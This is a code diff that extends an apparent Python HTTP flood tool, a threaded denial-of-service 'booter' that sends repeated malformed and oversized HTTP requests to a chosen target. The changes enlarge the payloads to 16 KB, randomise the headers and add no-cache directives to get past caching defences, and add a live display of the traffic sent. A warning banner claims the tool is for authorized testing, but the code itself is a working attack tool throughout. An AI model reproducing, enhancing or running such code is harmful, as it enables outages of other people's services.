@@ -23,6 +23,7 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(
 
 stop_attack = threading.Event()
 success_count = 0  # Track successful connections
+total_bytes_sent = 0  # Track total bytes sent
 
 # Clear screen
 def clear_text():
@@ -38,31 +39,33 @@ def generate_url_path_choice(num):
     return ''.join(random.choice(letter) for _ in range(int(num)))
 
 # Generate large payload
-def generate_large_payload(size=4096):
+def generate_large_payload(size=8192):
     return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(size))
 
-# List of User-Agents for randomization
+# List of User-Agents and other headers
 user_agents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version:...",
 ]
+accepts = ["text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "application/json", "*/*"]
+referers = ["https://www.google.com", "https://www.bing.com", f"https://{random.choice(['example.com', 'test.com'])}"]
 
 # Attack logic
-def DoS_Attack(ip, host, port, type_attack, booter_sent, data_type_loader_packet, use_ssl=False):
-    global success_count
+def DoS_Attack(ip, host, port, type_attack, booster_sent, data_type_loader_packet, use_ssl=False):
+    global success_count, total_bytes_sent
     if stop_attack.is_set():
         return
     url_path = generate_url_path_pyflooder(5) if random.choice(['PY_FLOOD', 'CHOICES_FLOOD']) == "PY_FLOOD" else generate_url_path_choice(5)
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.setblocking(False)  # Non-blocking socket
+    s.settimeout(5)  # Blocking socket with 5s timeout
     if use_ssl:
         context = ssl.create_default_context()
         s = context.wrap_socket(s, server_hostname=host)
     try:
         payload_patterns = {
-            'PY': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\nAccept: text/html\n\n",
+            'PY': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\nAccept: {random.choice(accepts)}\nReferer: {random.choice(referers)}\nCache-Control: no-cache\n\n",
             'OWN1': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\n\n\r\r",
             'OWN2': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\r\r\n\n",
             'OWN3': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\n\r\n",
@@ -76,19 +79,19 @@ def DoS_Attack(ip, host, port, type_attack, booter_sent, data_type_loader_packet
             'TEST3': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\n\b\n\b\n\a\n\r\n\n",
             'TEST4': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\n\b\n\b\n\a\n\a\n\n\r\r",
             'TEST5': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\n\b\n\t\n\n\r\r",
-            'LARGE': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\nContent-Length: 4096\nAccept: text/html\nReferer: https://{host}\n\n{generate_large_payload(4096)}",
-            'XLARGE': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\nContent-Length: 8192\nAccept: text/html\nReferer: https://{host}\n\n{generate_large_payload(8192)}",
+            'LARGE': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\nContent-Length: 8192\nAccept: {random.choice(accepts)}\nReferer: {random.choice(referers)}\nCache-Control: no-cache\n\n{generate_large_payload(8192)}",
+            'XLARGE': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\nContent-Length: 16384\nAccept: {random.choice(accepts)}\nReferer: {random.choice(referers)}\nCache-Control: no-cache\n\n{generate_large_payload(16384)}",
         }
         packet_data = payload_patterns.get(data_type_loader_packet, payload_patterns['PY']).encode()
         s.connect((ip, port))
-        s.setblocking(True)  # Switch to blocking for sending
         sent_bytes = 0
-        for _ in range(booter_sent):
+        for _ in range(booster_sent):
             if stop_attack.is_set():
                 break
             s.sendall(packet_data)
             sent_bytes += len(packet_data)
         success_count += 1
+        total_bytes_sent += sent_bytes
         logging.info(f"Successful connection: Sent {sent_bytes} bytes to {ip}:{port}")
     except (ConnectionError, TimeoutError, socket.gaierror, ssl.SSLError) as e:
         logging.error(f"Attack error on {ip}:{port}: {type(e).__name__} - {str(e)}")
@@ -96,18 +99,22 @@ def DoS_Attack(ip, host, port, type_attack, booter_sent, data_type_loader_packet
         s.close()
 
 # Running attack with ThreadPoolExecutor
-def runing_attack(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet, use_ssl):
-    with ThreadPoolExecutor(max_workers=spam_loader) as executor:
+def runing_attack(ip, host, port_loader, time_loader, spam_loader, methods_loader, booster_sent, data_type_loader_packet, use_ssl):
+    with ThreadPoolExecutor(max_workers=min(spam_loader, 50)) as executor:
         while time.time() < time_loader and not stop_attack.is_set():
-            futures = [executor.submit(DoS_Attack, ip, host, port_loader, methods_loader, booter_sent, data_type_loader_packet, use_ssl) for _ in range(spam_loader)]
+            futures = [executor.submit(DoS_Attack, ip, host, port_loader, methods_loader, booster_sent, data_type_loader_packet, use_ssl) for _ in range(spam_loader)]
             for future in futures:
                 future.result()
 
 # Countdown + interrupt
 def countdown_timer(time_loader):
+    global total_bytes_sent
+    start_time = time.time()
     remaining = int(time_loader - time.time())
     while remaining > 0 and not stop_attack.is_set():
-        sys.stdout.write(f"\r{Fore.YELLOW}Time remaining: {remaining} seconds | Successful connections: {success_count}{Fore.RESET}")
+        elapsed = time.time() - start_time
+        traffic_kbps = (total_bytes_sent / 1024 / max(elapsed, 1)) if total_bytes_sent > 0 else 0
+        sys.stdout.write(f"\r{Fore.YELLOW}Time remaining: {remaining} seconds | Successful connections: {success_count} | Traffic: {traffic_kbps:.2f} KB/s{Fore.RESET}")
         sys.stdout.flush()
         if sys.stdin in select.select([sys.stdin], [], [], 1)[0]:
             _ = sys.stdin.readline()
@@ -117,7 +124,8 @@ def countdown_timer(time_loader):
         time.sleep(1)
         remaining = int(time_loader - time.time())
     if not stop_attack.is_set():
-        print(f"\n{Fore.GREEN}Attack completed | Total successful connections: {success_count}{Fore.RESET}")
+        traffic_kbps = (total_bytes_sent / 1024 / max(elapsed, 1)) if total_bytes_sent > 0 else 0
+        print(f"\n{Fore.GREEN}Attack completed | Total successful connections: {success_count} | Total traffic: {total_bytes_sent / 1024:.2f} KB | Avg: {traffic_kbps:.2f} KB/s{Fore.RESET}")
         stop_attack.set()
 
 # Exit confirmation
@@ -148,7 +156,7 @@ def validate_target(target):
 
 # Main command loop
 def command():
-    global stop_attack, success_count
+    global stop_attack, success_count, total_bytes_sent
     print(f"{Fore.RED}WARNING: This tool is for AUTHORIZED SECURITY TESTING ONLY. Unauthorized use is ILLEGAL and may result in severe legal consequences. Ensure you have explicit permission from the server owner before proceeding.{Fore.RESET}")
     while True:
         try:
@@ -172,11 +180,33 @@ def command():
                         print(f"{Fore.RED}Port must be a number between 1-65535{Fore.RESET}")
                         continue
                     time_loader = time.time() + int(args_get[4])
-                    spam_loader = int(args_get[5])  # No upper limit, user responsibility
-                    create_thread = int(args_get[6])
-                    booter_sent = int(args_get[7])
+                    try:
+                        spam_loader = int(args_get[5])
+                        if spam_loader > 500:
+                            print(f"{Fore.YELLOW}Warning: SPAM_THREAD > 500 may overload your system. Proceed with caution.{Fore.RESET}")
+                    except ValueError:
+                        print(f"{Fore.RED}SPAM_THREAD must be a number{Fore.RESET}")
+                        continue
+                    try:
+                        create_thread = int(args_get[6])
+                        if create_thread > 500:
+                            print(f"{Fore.YELLOW}Warning: CREATE_THREAD > 500 may overload your system. Proceed with caution.{Fore.RESET}")
+                    except ValueError:
+                        print(f"{Fore.RED}CREATE_THREAD must be a number{Fore.RESET}")
+                        continue
+                    try:
+                        booster_sent = int(args_get[7])
+                    except ValueError:
+                        print(f"{Fore.RED}BOOTER_SENT must be a number{Fore.RESET}")
+                        continue
                     methods_loader = args_get[8]
-                    spam_create_thread = int(args_get[9])
+                    try:
+                        spam_create_thread = int(args_get[9])
+                        if spam_create_thread > 500:
+                            print(f"{Fore.YELLOW}Warning: SPAM_CREATE > 500 may overload your system. Proceed with caution.{Fore.RESET}")
+                    except ValueError:
+                        print(f"{Fore.RED}SPAM_CREATE must be a number{Fore.RESET}")
+                        continue
 
                     ip, host, use_ssl = validate_target(target_loader)
                     if not ip:
@@ -185,11 +215,12 @@ def command():
 
                     stop_attack.clear()
                     success_count = 0
-                    print(f"{Fore.LIGHTCYAN_EX}Starting attack\n{Fore.YELLOW}Target: {target_loader}\nPort: {port_loader}\nType: {data_type_loader_packet}\nProtocol: {'HTTPS' if use_ssl else 'HTTP'}{Fore.RESET}")
+                    total_bytes_sent = 0
+                    print(f"{Fore.LIGHTCYAN_EX}Starting attack\n{Fore.YELLOW}Target: {target_loader}\nPort: {port_loader}\nType: {data_type_loader_packet}\nProtocol: {'HTTPS' if use_ssl else 'HTTP'}\nThreads: {spam_loader}x{create_thread}x{spam_create_thread}{Fore.RESET}")
 
                     for _ in range(create_thread):
                         for _ in range(spam_create_thread):
-                            threading.Thread(target=runing_attack, args=(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet, use_ssl)).start()
+                            threading.Thread(target=runing_attack, args=(ip, host, port_loader, time_loader, spam_loader, methods_loader, booster_sent, data_type_loader_packet, use_ssl)).start()
 
                     countdown_timer(time_loader)
                     continue
